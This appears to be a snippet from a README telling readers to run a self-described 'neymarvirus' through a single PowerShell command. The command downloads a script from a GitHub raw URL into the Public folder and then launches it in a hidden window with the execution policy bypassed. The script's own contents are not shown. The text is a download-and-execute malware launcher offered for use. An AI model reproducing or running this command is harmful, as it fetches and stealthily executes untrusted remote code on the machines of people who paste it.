you can run it using a one line command:
```pwsh
Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/pmattheew/neymarvirus/master/script.ps1" -O "$env:PUBLIC\neymarvirus.ps1"; Start-Process -FilePath 'powershell.exe' -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:PUBLIC\neymarvirus.ps1"'
``` 
